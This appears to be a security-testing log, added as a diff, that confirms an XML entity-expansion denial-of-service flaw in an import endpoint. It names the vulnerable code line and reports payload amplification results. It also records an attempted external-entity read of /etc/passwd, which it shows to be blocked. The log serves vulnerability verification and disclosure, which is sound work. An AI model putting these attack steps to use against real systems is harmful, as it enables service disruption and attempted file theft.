@@ -1,0 +1,17 @@
+==============================================================================
+VULN-032: XML-import internal entity-expansion / uncapped DOM DoS (NOT XXE) via /import/analyze
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: TemporaryFileToXmlImportService.cs:66 XDocument.LoadAsync(LoadOptions.None) — DTD parsed, no size cap
+[SETUP] authenticated (import/analyze + temp-file are floor-only: ANY backoffice user; admin used here)
+[STEP] baseline: trivial XML (36 B) -> analyze HTTP 400 in 8 ms
+[STEP] expansion payload: input 455 B -> ~262,144 expanded chars (amplification x576)
+[PROOF]   GET /import/analyze -> HTTP 400 in 0.02s (the DTD was PARSED and internal entities expanded during XDocument.LoadAsync)
+[STEP] expansion payload: input 439 B -> ~1,048,576 expanded chars (amplification x2,389)
+[PROOF]   GET /import/analyze -> HTTP 400 in 0.04s (the DTD was PARSED and internal entities expanded during XDocument.LoadAsync)
+[STEP] expansion payload: input 435 B -> ~6,291,456 expanded chars (amplification x14,463)
+[PROOF]   GET /import/analyze -> HTTP 400 in 0.17s (the DTD was PARSED and internal entities expanded during XDocument.LoadAsync)
+[PROOF] parse time grew with expanded size: trivial=8ms -> 23ms (262,144 ch) -> 44ms (1,048,576 ch) -> 170ms (6,291,456 ch); a ~435 B request forced ~6,291,456 chars of work (amplification x14,463)
+[STEP] not-XXE check: upload external-entity payload (file:///etc/passwd) and confirm no file contents leak
+[PROOF] external-entity analyze -> HTTP 400 in 15ms; /etc/passwd contents ABSENT from response → XmlResolver=null blocks external entities = DoS-only, NOT XXE (confirms correction)
+==> VULN-032: CONFIRMED — a ~435B XML forced ~6,291,456 chars of parse work (0.17s vs 8ms trivial); external entity did NOT resolve (DoS, not XXE)
